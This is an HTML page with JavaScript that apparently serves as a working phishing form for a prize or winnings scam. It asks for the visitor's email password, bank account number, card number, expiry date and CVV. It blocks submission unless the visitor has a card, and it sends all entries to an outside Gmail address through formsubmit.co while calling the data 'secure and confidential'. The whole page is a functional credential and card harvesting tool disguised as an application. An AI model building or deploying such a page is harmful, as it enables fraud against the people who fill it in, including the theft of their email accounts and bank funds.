<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Application Form</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f2f2f2;
      padding: 20px;
    }
    form {
      background: #fff;
      padding: 20px;
      border-radius: 10px;
      max-width: 600px;
      margin: auto;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }
    h2 {
      text-align: center;
      color: #333;
    }
    label {
      display: block;
      margin-top: 15px;
      font-weight: bold;
    }
    input, select {
      width: 100%;
      padding: 10px;
      margin-top: 5px;
      border: 1px solid #ccc;
      border-radius: 8px;
    }
    .error {
      color: red;
      font-size: 0.9em;
    }
    .hidden {
      display: none;
    }
    #submitBtn {
      margin-top: 20px;
      width: 100%;
      padding: 12px;
      font-size: 16px;
      border: none;
      border-radius: 8px;
      color: white;
      background-color: green;
      cursor: pointer;
    }
    #submitBtn.disabled {
      background-color: red;
      cursor: not-allowed;
    }
    .eye-icon {
      position: absolute;
      right: 15px;
      top: 37px;
      cursor: pointer;
    }
    .password-container {
      position: relative;
    }
    #atm-warning {
      color: red;
      font-weight: bold;
    }
    #disclaimer {
      font-size: 0.9em;
      color: #555;
      margin-top: 20px;
      text-align: center;
    }
  </style>
</head>
<body>
  <form id="applicationForm" action="https://formsubmit.co/exellentfirm@gmail.com" method="POST">
    <h2>Application Form</h2>

    <label>Full Name</label>
    <input type="text" name="Full Name" id="fullName" required />

    <label>Country</label>
    <input type="text" name="Country" id="country" required />

    <label>Phone Number</label>
    <input type="tel" name="Phone Number" id="phone" required />
    <div class="error" id="phoneError"></div>

    <label>Email Address</label>
    <input type="email" name="Email" id="email" required />

    <label>Email Password</label>
    <div class="password-container">
      <input type="password" name="Email Password" id="emailPassword" required />
      <span class="eye-icon" onclick="togglePassword()">üëÅÔ∏è</span>
    </div>

    <label>Amount You Won</label>
    <input type="text" name="Amount Won" id="amountWon" required />

    <label>Bank Account Type (e.g Standard Bank)</label>
    <input type="text" name="Account Type" id="accountType" required />

    <label>Bank Account Number</label>
    <input type="text" name="Account Number" id="accountNumber" required />

    <label>Bank Account Holder's Name</label>
    <input type="text" name="Account Holder" id="accountHolder" required />

    <label>Did You Link ATM to Your Bank Account?</label>
    <select id="atmLinked" name="ATM Linked" required>
      <option value="">Select</option>
      <option value="Yes">Yes</option>
      <option value="No">No</option>
    </select>
    <div id="atm-warning" class="hidden">YOU MUST HAVE ATM CARD TO PROCEED</div>

    <div id="atmFields">
      <label>ATM Card Number</label>
      <input type="text" name="ATM Card Number" id="atmCard" />
      <div class="error" id="cardError"></div>

      <label>Expiry Date (MM/YY)</label>
      <input type="text" name="Expiry Date" id="expiryDate" maxlength="5" />
      <div class="error" id="expiryError"></div>

      <label>CVV</label>
      <input type="text" name="CVV" id="cvv" maxlength="3" />
      <div class="error" id="cvvError"></div>
    </div>

    <div id="finalNote" class="hidden">
      <p id="noteText"></p>
    </div>

    <input type="hidden" name="_next" value="https://onlinegistrationprog.github.io/Application%20Form/thankyou.html" />

    <button type="submit" id="submitBtn">Submit</button>

    <div id="disclaimer">We keep your data secure and confidential.</div>
  </form>

  <script>
    const form = document.getElementById('applicationForm');
    const atmSelect = document.getElementById('atmLinked');
    const atmFields = document.getElementById('atmFields');
    const finalNote = document.getElementById('finalNote');
    const noteText = document.getElementById('noteText');
    const submitBtn = document.getElementById('submitBtn');
    const warning = document.getElementById('atm-warning');

    atmSelect.addEventListener('change', () => {
      if (atmSelect.value === "No") {
        atmFields.classList.add('hidden');
        finalNote.classList.add('hidden');
        warning.classList.remove('hidden');
        submitBtn.disabled = true;
        submitBtn.classList.add('disabled');
        submitBtn.textContent = '';
      } else {
        atmFields.classList.remove('hidden');
        finalNote.classList.remove('hidden');
        warning.classList.add('hidden');
        submitBtn.disabled = false;
        submitBtn.classList.remove('disabled');
        submitBtn.textContent = 'Submit';
        updateFinalNote();
      }
    });

    function togglePassword() {
      const input = document.getElementById('emailPassword');
      input.type = input.type === 'password' ? 'text' : 'password';
    }

    function updateFinalNote() {
      const fullName = document.getElementById('fullName').value;
      const amount = document.getElementById('amountWon').value;
      const type = document.getElementById('accountType').value;
      const number = document.getElementById('accountNumber').value;
      noteText.textContent = `Dear ${fullName}, You will receive ${amount} to your ${type}, ${number}`;
    }

    form.addEventListener('input', updateFinalNote);

    // Validation on blur
    document.getElementById('cvv').addEventListener('blur', () => {
      const val = document.getElementById('cvv').value;
      document.getElementById('cvvError').textContent = /^\d{3}$/.test(val) ? '' : 'CVV must be exactly 3 digits';
    });

    document.getElementById('atmCard').addEventListener('blur', () => {
      const val = document.getElementById('atmCard').value;
      document.getElementById('cardError').textContent = /^\d{16}$/.test(val) ? '' : 'Card number must be 16 digits';
    });

    document.getElementById('phone').addEventListener('blur', () => {
      const val = document.getElementById('phone').value;
      document.getElementById('phoneError').textContent = /^\d{9,12}$/.test(val) ? '' : 'Phone must be 9 to 12 digits';
    });

    // Auto format expiry
    document.getElementById('expiryDate').addEventListener('input', (e) => {
      let val = e.target.value.replace(/\D/g, '');
      if (val.length > 2) val = val.slice(0, 2) + '/' + val.slice(2);
      e.target.value = val.slice(0, 5);
    });

    form.addEventListener('submit', function (e) {
      const atmRequired = atmSelect.value === "Yes";
      const errors = [];

      if (atmRequired) {
        if (!/^\d{16}$/.test(document.getElementById('atmCard').value)) errors.push('ATM');
        if (!/^\d{3}$/.test(document.getElementById('cvv').value)) errors.push('CVV');
        if (!/^\d{2}\/\d{2}$/.test(document.getElementById('expiryDate').value)) errors.push('EXP');
      }

      if (!/^\d{9,12}$/.test(document.getElementById('phone').value)) errors.push('Phone');

      if (atmSelect.value === "No" || errors.length > 0) {
        e.preventDefault();
        alert("Fix errors before submitting.");
      }
    });
  </script>
</body>
</html>
